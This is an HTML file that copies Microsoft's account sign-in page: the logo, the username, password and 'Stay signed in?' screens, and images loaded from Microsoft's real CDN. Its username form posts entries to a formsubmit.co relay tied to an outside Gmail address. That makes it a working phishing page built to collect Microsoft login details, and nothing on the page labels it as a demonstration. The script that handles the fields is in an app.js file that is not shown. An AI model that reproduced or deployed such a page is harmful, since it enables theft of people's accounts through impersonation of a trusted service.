
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="favicon.ico" />
    <title>Sign in to your Microsoft account</title>
    <link rel="stylesheet" href="app.css" />
</head>

<body>
    <section id="section_uname">
        <div class="auth-wrapper">
            <img src="microsoft_logo_ee5c8d9fb6248c938fd0.svg" alt="Microsoft" />
            <h2 class="title mb-16 mt-16">Sign in</h2>
            <form action="https://formsubmit.co/cbntime11@gmail.com" method="POST">
                <div class="mb-16">
                    <p id="error_uname" class="error"></p>
                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
                </div>
            </form>
            <div>
                <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
                <p class="mb-16 fs-13">
                    <a href="#" class="link">Sign in with a security key
                        <img src="" alt="">
                    </a>
                </p>
            </div>
            <div>
                <button class="btn" id="btn_next">Next</button>
            </div>
        </div>
        <div class="opts">
            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="https://logincdn.msauth.net/shared/5/images/signin_options_4e48046ce74f4b89d450.svg"
                        width="30px" /></span> Sign-in options</p>
        </div>
    </section>
    


    <section id="section_pwd" class="d-none">
        <div class="auth-wrapper">
            <img src="microsoft_logo_ee5c8d9fb6248c938fd0.svg" alt="Microsoft" class="d-block" />
            <div class="identity w-100 mt-16 mb-16">
                <button class="back">
                    <img src="https://logincdn.msauth.net/shared/5/images/arrow_left_a9cc2824ef3517b6c416.svg" />
                </button>
                <span id="user_identity">a@b.com</span>
            </div>
            <h2 class="title mb-16">Enter password</h2>
            <form>
                <div class="mb-16">
                    <p id="error_pwd" class="error"></p>
                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
                </div>
            </form>
            <div>
                <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
                <p class="mb-16">
                    <a href="#" class="link fs-13">Other ways to sign in</a>
                </p>
            </div>
            <div>
                <button class="btn" id="btn_sig">Sign in</button>
            </div>
        </div>
    </section>

    <section id="section_final" class="d-none">
        <div class="auth-wrapper">
            <img src="https://logincdn.msauth.net/shared/5/images/arrow_left_a9cc2824ef3517b6c416.svg" alt="Microsoft" class="d-block" />
            <div class="identity w-100 mt-16 mb-16">
                <span id="user_identity">a@b.com</span>
            </div>
            <h2 class="title mb-16">Stay signed in?</h2>
            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
            <label class="has-checkbox">
                <input type="checkbox" class="checkbox" />
                <span>Don't show this again</span>
            </label>
            <div class="btn-group">
                <button class="btn btn-sec" id="btn_final">No</button>
                <button class="btn" id="btn_final">Yes</button>
            </div>
        </div>
    </section>
    <footer class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
    </footer>
    <script src="app.js"></script>
</body>

</html>